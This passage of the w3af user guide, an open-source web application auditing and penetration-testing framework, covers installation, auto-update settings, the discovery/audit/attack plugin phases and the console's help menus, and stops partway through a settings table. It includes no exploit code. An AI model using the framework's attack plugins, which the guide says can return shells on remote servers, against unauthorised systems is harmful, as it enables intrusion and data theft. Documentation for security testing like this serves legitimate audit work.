<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
	<META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
	<TITLE></TITLE>
	<META NAME="GENERATOR" CONTENT="OpenOffice.org 2.4  (Unix)">
	<META NAME="CREATED" CONTENT="20070514;16454200">
	<META NAME="CHANGEDBY" CONTENT="jandalia">
	<META NAME="CHANGED" CONTENT="20110128;12461000">
	<STYLE TYPE="text/css">
	<!--
		@page { size: 8.5in 11in; margin: 0.79in }
		P { margin-bottom: 0.08in }
		H2 { margin-bottom: 0.08in }
		H2.western { font-family: "Bitstream Vera Sans", sans-serif; font-size: 14pt; font-style: italic }
		H2.cjk { font-family: "Bitstream Vera Sans"; font-size: 14pt; font-style: italic }
		H2.ctl { font-family: "Bitstream Vera Sans"; font-size: 14pt; font-style: italic }
		H3 { margin-bottom: 0.08in }
		H3.western { font-family: "Bitstream Vera Sans", sans-serif }
		H3.cjk { font-family: "Bitstream Vera Sans" }
		H3.ctl { font-family: "Bitstream Vera Sans" }
	-->
	</STYLE>
</HEAD>
<BODY LANG="en-US" DIR="LTR">
<P ALIGN=CENTER STYLE="margin-top: 0.17in; page-break-after: avoid"><BR><BR>
</P>
<P ALIGN=CENTER STYLE="margin-top: 0.17in; page-break-after: avoid"><BR><BR>
</P>
<P ALIGN=CENTER STYLE="margin-top: 0.17in; page-break-after: avoid"><BR><BR>
</P>
<P ALIGN=CENTER STYLE="margin-top: 0.17in; page-break-after: avoid"><BR><BR>
</P>
<P ALIGN=CENTER STYLE="margin-top: 0.17in; page-break-after: avoid"><BR><BR>
</P>
<P ALIGN=CENTER STYLE="margin-top: 0.17in; page-break-after: avoid"><FONT FACE="Bitstream Vera Sans, sans-serif"><FONT SIZE=4 STYLE="font-size: 16pt"><U><B>w3af
User Guide</B></U></FONT></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<FONT SIZE=2>Document version: <B>1.9</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<FONT SIZE=2>Original author: <B>Andres Riancho</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: medium; text-decoration: none">
<FONT SIZE=2>Reviewed by: </FONT>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; text-decoration: none">
<FONT SIZE=2><B>Javier Andalia</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; text-decoration: none">
<FONT SIZE=2><B>Mike Harbison</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; text-decoration: none">
<FONT SIZE=2><B>Andy Bach</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; text-decoration: none">
<FONT SIZE=2><B>Chris Teodorski</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; text-decoration: none">
<BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><FONT SIZE=2><I><U><B>January
28, 2010</B></U></I></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in; page-break-before: always">
<BR>
</P>
<DIV ID="Table of Contents1" DIR="LTR">
	<DIV ID="Table of Contents1_Head" DIR="LTR">
		<P STYLE="margin-top: 0.17in; page-break-after: avoid"><FONT FACE="Bitstream Vera Sans, sans-serif"><FONT SIZE=4 STYLE="font-size: 16pt"><B>Table
		of Contents</B></FONT></FONT></P>
	</DIV>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Introduction 	3</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Download	3</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">Installation
	Requirements	3</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Auto-Update	4</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">w3af phases	6</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Running w3af	6</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">Running w3af with
	GTK user interface	11</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">Plugins	12</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">Plugin
	configuration	13</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Starting a scan	17</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">A complete
	session	18</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">A warning about
	discovery	20</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">When everything
	else fails...	21</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">w3af scripts	21</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">The Output	24</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Complex sites	26</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Exploiting	28</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">Advanced
	exploiting techniques	30</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">Virtual daemon	31</P>
	<P STYLE="margin-left: 0.39in; margin-bottom: 0in">w3afAgent	35</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">More
	information	39</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Bugs	39</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Contributors	39</P>
	<P STYLE="margin-left: 0.2in; margin-bottom: 0in">Final words	40</P>
</DIV>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
</P>
<H2 CLASS="western"></H2>
<H2 CLASS="western" STYLE="page-break-before: always"><A NAME="SECTION00200000000000000000"></A>
Introduction 
</H2>
<P ALIGN=JUSTIFY>This document is a user guide for the Web
Application Attack and Audit Framework ( w3af ), its goal is to
provide a basic overview of what the framework is, how it works and
what you can do with it. 
</P>
<P ALIGN=JUSTIFY>w3af is a complete environment for auditing and
attacking web applications. This environment provides a solid
platform for auditing and penetration-testing. 
</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<H2 CLASS="western">Download</H2>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
framework can be downloaded from the project main page: </FONT>
</P>
<P STYLE="margin-left: 0.49in; margin-top: 0.17in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://w3af.sf.net/#download">http://w3af.sf.net/#download</A></FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-top: 0.17in"><FONT FACE="Bitstream Vera Sans, sans-serif">There
are two ways to install w3af: from a release package (w3af setup for
windows and tgz package for Unix based systems) or from SVN. First
time users should use the latest package, while more advanced users
should perform a SVN checkout to get the latest version of the
framework. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-top: 0.17in"><FONT SIZE=4><I><B>Installation</B></I></FONT></P>
<P ALIGN=JUSTIFY STYLE="background: #ffffff; font-style: normal; text-decoration: none">
<FONT SIZE=3>The framework should work on all platforms supported <SPAN STYLE="background: #ffffff">by
Python.</SPAN> w3af has been teste<SPAN STYLE="background: #ffffff">d
on Linux, Window</SPAN>s XP, Windows Vista and OpenBSD. This user
guide will guide you through the installation on a Linux platform.
installing w3af in a Windows box is straight forward if you use the
available installer which can be downloaded from the official w3af
site.</FONT></P>
<H3 CLASS="western" ALIGN=JUSTIFY STYLE="font-style: normal; page-break-after: avoid">
Installation Requirements</H3>
<P>The required packages to run w3af can be divided in two groups:</P>
<UL>
	<LI><P>Core requirements:</P>
</UL>
<UL>
	<LI VALUE=1><P>Python <B>2.5</B></P>
	<LI><P>fpconst-0.7.2</P>
	<LI><P>nltk</P>
	<LI><P>SOAPpy</P>
	<LI><P>pyPdf</P>
	<LI><P>Python bindings for the libxml2 library</P>
	<LI><P>Python OpenSSL</P>
	<LI><P>json.py</P>
	<LI><P>scapy</P>
	<LI><P>pysvn</P>
	<P></P>
</UL>
<UL>
	<LI VALUE=1><P>Graphical user interface requirements:</P>
</UL>
<UL>
	<LI><P>python sqlite3</P>
	<LI><P>graphviz</P>
</UL>
<UL>
	<LI VALUE=1><P>pygtk 2.0</P>
	<LI><P>gtk 2.12</P>
</UL>
<UL>
	<P></P>
</UL>
<P ALIGN=JUSTIFY>As you may have guessed, the core requirements are
needed to run w3af with any user interface (console or graphical),
and the graphical user interface requirements are needed only if you
plan to use the GTK+ user interface.</P>
<P ALIGN=JUSTIFY>Some of the requirements are bundled with the
distribution file, in order to make the installation process easier
for the novice user. The bundled requirements can be found inside the
<I>extlib</I> directory. Most of the libraries can be run from<SPAN STYLE="font-style: normal">
that</SPAN> directory, but some others require an installation
process, the installation steps for these libraries are (as root):</P>
<P><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">cd
w3af</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="background: #ffffff">cd
extlib</SPAN></FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">cd
fpconst-0.7.2</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">python
setup.py install</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">cd
..</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">cd
SOAPpy</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">python
setup.py install</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">cd
..</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">cd
pyPdf</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">python
setup.py install</FONT></P>
<H2 CLASS="western" STYLE="page-break-after: avoid"><FONT FACE="Bitstream Vera Sans, sans-serif">Auto-Update</FONT></H2>
<P ALIGN=JUSTIFY>The framework also includes an auto-update feature.
This feature allows you to run our latest SVN version without
worrying about executing the “<FONT FACE="Nimbus Mono L, monospace">svn
update</FONT>” command or even having a SVN client. You can
configure your local w3af instance to do it for you once a day,
weekly or monthly.</P>
<P ALIGN=JUSTIFY>The auto-update feature is enabled by default and
its configuration can be changed using the “startup.conf” file
which is saved (<FONT FACE="Nimbus Mono L, monospace">~/.w3af/startup.conf</FONT>)
after the first w3af run.  The startup.conf file looks like this:</P>
<UL>
	<P></P>
</UL>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>[STARTUP_CONFIG]
</B></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">last-update
= 2011-01-24 </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>#
Valid values: D</B><SPAN STYLE="font-weight: medium">[aily]</SPAN><B>,
W</B><SPAN STYLE="font-weight: medium">[eekly]</SPAN><B>, [M]</B><SPAN STYLE="font-weight: medium">onthly</SPAN></FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">frequency
= D </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">auto-update
= true</FONT></P>
<P>Depending on this configuration w3af will know when to perform the
next  update verification. However you are able to force the update
to take place, or not, by simply giving the startup script the
desired option: <FONT FACE="Nimbus Mono L, monospace">--force-update
or –no-update</FONT>.</P>
<P>This is the typical console output when the auto-update process is
performed.</P>
<P><FONT FACE="Nimbus Mono L, monospace"><B>	</B><B>$</B>
./w3af_console -f </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	Checking if a new version
is available in our SVN repository. </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	Please wait... </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	Your current w3af
installation is r14. Do you want to update to </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	r16 [y/N]? <B>y </B></FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	w3af is updating from the
official SVN server... </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	<B>NEW</B>
/home/w3af/spam/eggs/__init__.py </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	<B>UPD</B>
/home/w3af/spam/eggs/vulnerability.py </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	At revision 16. </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	Do you want to see a
summary of the new code commits log </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	messages? [y/N]? <B>y</B> </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">	Revision 16: </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">		1. Rem new dependency </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">		2. Added new dependency </FONT>
</P>
<P><FONT FACE="Nimbus Mono L, monospace">		3. Dep change </FONT>
</P>
<P>	<B>w3af&gt;&gt;&gt;</B><FONT FACE="Nimbus Mono L, monospace"><B> </B></FONT>
</P>
<P>Sometimes it may happen that the last update has something that
you may not be happy about. w3af gives the option to go back to the
last local working version for those cases. You can do it by simply
using the <FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">“-r”
or “--revision”</SPAN></FONT> option along with the <FONT FACE="Nimbus Mono L, monospace"><FONT SIZE=3>PREV
</FONT></FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><FONT SIZE=3>argument</FONT></FONT><FONT FACE="Bitstream Vera Sans, sans-serif">:</FONT></P>
<P><FONT SIZE=3>	<FONT FACE="Nimbus Mono L, monospace"><B>$</B></FONT><FONT FACE="Nimbus Mono L, monospace">
./w3af_console -r PREV </FONT><FONT FACE="Nimbus Mono L, monospace"><B>#
Update code to PREVious local rev.</B></FONT></FONT></P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif"><FONT SIZE=3>Consistently
you can also do this:</FONT></FONT></P>
<P><FONT SIZE=3><B>	<FONT FACE="Nimbus Mono L, monospace">$</FONT></B><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">
./w3af_console -r HEAD</SPAN></FONT><SPAN STYLE="font-weight: medium">
</SPAN></FONT>
</P>
<P><FONT SIZE=3>Which is equivalent to force the update to the last
revision using the mentioned <FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">“-f”</SPAN></FONT>
option.</FONT></P>
<P><FONT SIZE=3>Finally, you can also force the update to a specific
revision:</FONT></P>
<P><FONT SIZE=3>	<FONT FACE="Nimbus Mono L, monospace"><B>$</B></FONT><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">
./w3af_console -r 1234</SPAN></FONT></FONT></P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><BR><BR>
</P>
<H2 CLASS="western" STYLE="page-break-after: avoid"><FONT FACE="Bitstream Vera Sans, sans-serif"><I>w3af
phases</I></FONT></H2>
<P ALIGN=JUSTIFY>Before running w3af a user must know how the
application is divided and how plugins are going to be executed. The
framework has three types of plugins: discovery , audit and attack.</P>
<P ALIGN=JUSTIFY><I>Discovery plugins</I> have only one
responsibility, finding new URLs, forms, and other “injection
points”. A classic example of a discovery plugin is a web spider.
This plugin takes a URL as input and returns one or more injection
points. When a user enables more than one plugin of this type, they
work in a loop: If plugin A finds a new URL in the first run, the
w3af core will send that URL to plugin B. If plugin B then finds a
new URL, it will be sent to plugin A. This process will go on until
all plugins are run and no more knowledge about the application can
be found using the enabled discovery plugins.</P>
<P ALIGN=JUSTIFY><I>Audit plugins</I> take the injection points found
by discovery plugins and send specially crafted data to all of them
in order to find vulnerabilities. A classic example of an audit
plugin is one that searches for SQL injection vulnerabilities.</P>
<P ALIGN=JUSTIFY><I>Attack plugins </I><SPAN STYLE="font-style: normal">objective
is to exploit vulnerabilities found by audit plugins. They usually
return a shell on the remote server, or a dump of remote tables in
the case of SQL injections exploits.</SPAN></P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<H2 CLASS="western"><I>Running w3af</I></H2>
<P ALIGN=JUSTIFY STYLE="font-style: normal">w3af has two user
interfaces, the console user interface (consoleUI) and the graphical
user interface (gtkUi). This user guide will focus on the consoleUI,
which ismore fully tested and complete than the gtkUi. To fire up the
consoleUI you just have to execute w3af without parameters and you
will get a prompt like this one:</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
./w3af_console</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">From
this prompt you will be able to configure the framework, launch scans
and ultimately exploit a vulnerability. At this  prompt you can start
typing commands. The first command you have to learn is “help”
(please note that commands are case sensitive):</FONT></P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
help</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
start         | Start the scan.                      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
plugins       | Enable and configure plugins.        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
exploit       | Exploit the vulnerability.           | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
profiles      | List and use scan profiles.          | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
http-settings | Configure the http settings of the   |</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
              | framework.                           | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
misc-settings | Configure w3af misc settings.        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
target        | Configure the target URL.            | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
back          | Go to the previous menu.             | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
exit          | Exit w3af.                           | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
assert        | Check assertion.                     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
help          | Display help. issuing: help [command]|</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
              | , prints more specific help about    |</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
              | &quot;command&quot;                            | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
version       | Show w3af version information.       | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
keys          | Display key shortcuts.               | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
help target</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">Configure
the target URL.</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">The
main menu commands are explained in the help that is displayed above.
The internals of every menu will be seen later in this document. As
you already noticed, the “help” command can take a parameter, and
if available, a detailed help for that parameter will be shown, <FONT FACE="Bitstream Vera Sans, sans-serif"><SPAN STYLE="font-style: normal"><SPAN STYLE="background: transparent">e.g.
“help keys”.</SPAN></SPAN></FONT></FONT></P>
<P ALIGN=JUSTIFY STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">Other
interesting things to notice about the consoleUI is  the ability for
tabbed completion (type 'plu' and then TAB) and the command history
(after typing some commands, navigate the history with the up and
down arrows).</FONT></P>
<P ALIGN=JUSTIFY STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">To
enter a configuration menu, you just have to type its name and hit
enter, you will see how the prompt changes and you are now in that
context:</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">http-settings
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B></FONT></P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">All
the configuration menus provide the following commands:</FONT></P>
<UL>
	<LI><P STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">help</FONT></P>
	<LI><P STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">view</FONT></P>
	<LI><P STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">set</FONT></P>
	<LI><P STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">back</FONT></P>
</UL>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">Here
is a usage example of this commands in the http-settings menu:</FONT></P>
<P STYLE="font-style: normal"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B>
help</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
view   | List the available options and their values.       | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
set    | Set a parameter value.                             | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
back   | Go to the previous menu.                           | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
exit   | Exit w3af.                                         | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|
assert | Check assertion.                                   | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:http-settings&gt;&gt;&gt;</B>
view</FONT></P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">| Setting                  |
Value              | Description |
--------------------------------------------------------------| </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">| timeout                  | 10
                | The         | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | timeout     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | for         | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | connections |                          |           
              |                    | to the      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | HTTP        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | server      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">| headersFile              |   
                | Set the     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | headers     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | filename.   | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | This        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | file        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | has         | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | additional  | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | headers     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | that        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | are         | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | added       | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | to each     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|                          |   
                | request.    | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
<FONT FACE="Nimbus Mono L, monospace">|-------------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-style: normal; font-weight: medium">
